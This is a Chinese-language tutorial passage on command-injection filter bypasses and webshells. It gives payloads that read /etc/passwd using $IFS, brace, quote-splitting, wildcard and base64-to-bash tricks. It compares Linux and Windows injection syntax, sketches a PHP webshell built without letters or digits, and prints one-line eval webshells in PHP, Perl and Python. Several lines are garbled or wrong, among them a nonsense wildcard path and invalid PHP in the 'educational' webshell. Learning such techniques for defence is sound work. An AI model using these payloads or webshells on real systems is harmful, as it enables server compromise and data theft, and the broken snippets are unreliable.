# 命令执行/代码执行深入

### 6.1 命令注入绕过

**空格绕过**

```bash
# 当空格被过滤时:
cat${IFS}/etc/passwd          # 使用环境变量 $IFS
cat$IFS/etc/passwd
{cat,/etc/passwd}              # 使用大括号
cat</etc/passwd               # 使用重定向
X=$'cat\x20/etc/passwd'&&$X   # 使用变量
```

**关键字绕过**

```bash
# 当 cat / flag 等关键字被过滤:
ca\t /etc/passwd               # 反斜杠拼接
ca''t /etc/passwd              # 单引号拼接
ca""t /etc/passwd              # 双引号拼接
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash   # Base64 解码执行

# 变量拼接
a=ca;b=t;$a$b /etc/passwd
```

**通配符绕过**

```bash
# 利用通配符匹配文件名:
/bin/cat /etc/passwd → /???/??t /???/??????
/bin/c?at /etc/pa??wd

# 利用 ? 和 * 匹配路径:
/power?r ?d?ear ?ean?ear
```

### 6.2 Linux/Windows命令注入差异

| 特性 | Linux | Windows |
|------|-------|---------|
| 命令连接符 | `;` `&&` `\|\|` | `&` `&&` `\|\|` |
| 换行执行 | `\n` | `%0a` / `%0d%0a` |
| 反引号执行 | `` `command` `` | 不支持 |
| 子 Shell | `$(command)` | 不支持 |
| 通配符 | `?` `*` `[...]` | `?` `*`（有限） |
| 空格替代 | `$IFS` `{}` `<` | `%09` (Tab) |

### 6.3 无字母数字Webshell

利用 PHP 动态特性，在过滤所有字母和数字的情况下执行代码：

```php
<?php
// 原理: 利用位运算和自增运算构造字符
// $_ = [] → Array
// $_ = @$_[""] → （访问不存在的键返回 NULL）
// $_ = $_['!' == false] → 'A' (Array[1])
// 通过自增构造任意字母

// 简化示例思路:
$_ = [];
$_ = @$_[""];
$_ = @$_['!' == $_];  // 获取 'A'
$__ = $_;              // 'A'
$__++; $__++; ...      // 通过自增获取其他字母
// 最终拼凑出函数名和参数

// 实际利用示例（教育演示）:
$__() = $$_{$_}{$_}();  // 构造系统调用
```

### 6.4 一句话原理

```php
// PHP 一句话
<?php @eval($_POST['cmd']); ?>
// 原理: eval() 执行 POST 参数 cmd 中的 PHP 代码
// @ 抑制错误输出

// Perl 一句话
#!/usr/bin/perl
eval $ENV{HTTP_CMD};
// 原理: 从环境变量读取并执行代码

// Python 一句话
import os; os.system(__import__('sys').argv[1])
// 原理: 从命令行参数获取命令并执行
```
